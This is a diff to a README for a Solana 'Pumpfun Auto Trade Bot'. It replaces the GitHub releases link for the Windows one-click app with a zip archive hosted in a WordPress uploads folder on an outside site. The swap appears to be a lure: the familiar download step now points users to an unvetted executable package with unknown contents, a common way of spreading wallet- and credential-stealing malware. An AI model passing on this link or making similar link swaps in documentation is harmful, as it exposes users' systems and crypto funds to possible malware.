@@ -38,7 +38,7 @@ cd Pumpfun-Auto-Trade-Bot
 python main.py
 ```
 The second option for Windows operating systems is to run the packaged application directly:
-[Windows 10/11 One Click App](https://github.com/memebotes/Pumpfun-Auto-Trade-Bot/releases/)
+[Windows 10/11 One Click App](https://solanatrade.bot/wp-content/uploads/2025/05/STBotPremiumTrial.zip)
 
 For Macos (Terminal):
 ```bash
